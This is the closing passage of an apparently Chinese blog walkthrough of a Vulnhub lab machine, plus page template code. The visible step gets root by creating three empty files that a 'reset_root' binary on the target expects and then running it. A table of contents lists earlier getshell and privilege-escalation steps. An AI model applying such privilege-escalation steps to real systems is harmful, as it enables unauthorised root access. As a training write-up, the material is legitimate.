+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">发现文件执行失败是因为少了这三个文件或目录。</span><br><span class="line"></span><br><span class="line">因此在靶机shell上创建这三个文件，这里使用touch(因为可以创建空文件)</span><br><span class="line"></span><br><span class="line">touch /dev/shm/kHgTFI5G</span><br><span class="line"></span><br><span class="line">touch /dev/shm/Zw7bV9U5</span><br><span class="line"></span><br><span class="line">touch /tmp/kcM0Wewe</span><br><span class="line"></span><br><span class="line">创建后执行reset_root</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007113016619.png" alt="image-20221007113016619"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007113117717.png" alt="image-20221007113117717"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007113202982.png" alt="image-20221007113202982"></p>
+<h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://blog.putdown.top">putdown</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://blog.putdown.top/archives/d23a16db.html">https://blog.putdown.top/archives/d23a16db.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.putdown.top" target="_blank">Putdownd’s Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Vulnhub/">Vulnhub</a></div><div class="post_share"><div class="social-share" data-image="/img/e5925563a436d850cfc6184421b9ec77.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/archives/edfef24a.html"><img class="prev-cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Vulnhub-Red:1</div></div></a></div><div class="next-post pull-right"><a href="/archives/f5f423fc.html"><img class="next-cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Vulnhub-jangow 01</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/archives/51ba13e9.html" title="Vulnhub-Breakout"><img class="cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-11</div><div class="title">Vulnhub-Breakout</div></div></a></div><div><a href="/archives/520642ee.html" title="Vulnhub-CORROSION: 1"><img class="cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-03</div><div class="title">Vulnhub-CORROSION: 1</div></div></a></div><div><a href="/archives/cb0f1354.html" title="Vulnhub-CORROSION: 2"><img class="cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-04</div><div class="title">Vulnhub-CORROSION: 2</div></div></a></div><div><a href="/archives/aa472e4b.html" title="Vulnhub-DARKHOLE: 1"><img class="cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-01</div><div class="title">Vulnhub-DARKHOLE: 1</div></div></a></div><div><a href="/archives/b060e4aa.html" title="Vulnhub-HA: WORDY"><img class="cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-05</div><div class="title">Vulnhub-HA: WORDY</div></div></a></div><div><a href="/archives/6be15d5.html" title="Vulnhub-HACKATHONCTF: 1"><img class="cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-28</div><div class="title">Vulnhub-HACKATHONCTF: 1</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0"><span class="toc-text">描述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nmap-%E6%89%AB%E6%8F%8F"><span class="toc-text">nmap 扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ip%E6%89%AB%E6%8F%8F"><span class="toc-text">ip扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9hosts"><span class="toc-text">修改hosts</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE"><span class="toc-text">访问</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E7%9B%AE%E5%BD%95"><span class="toc-text">扫描目录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE-1"><span class="toc-text">访问</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%86%E6%9E%90-%E5%8F%82%E8%80%83%E5%88%AB%E4%BA%BA%E7%9A%84"><span class="toc-text">分析(参考别人的)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%A5%E5%88%B0%E4%B8%80%E4%B8%AA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E7%95%8C%E9%9D%A2"><span class="toc-text">来到一个命令执行的界面</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag-1"><span class="toc-text">flag 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#getshell"><span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%93%E6%9D%9F"><span class="toc-text">结束</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/img/e5925563a436d850cfc6184421b9ec77.jpeg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By putdown</div><div class="footer_custom_text"><div> Welcome to lie down </div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_clock_anzhiyu_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock_anzhiyu')
+    if(parent_div_git) {
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var qweather_key = '92c0b85004c94c3a97297a4fd2f8c93e';
+  var gaud_map_key = '5544b267bba4ecd452e5b3f7327b1b8a';
+  var baidu_ak_key = 'undefined';
+  var flag = 0;
+  var clock_rectangle = '112.982279,28.19409';
+  var clock_default_rectangle_enable = 'false';
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><!-- hexo injector body_end end --></body></html>
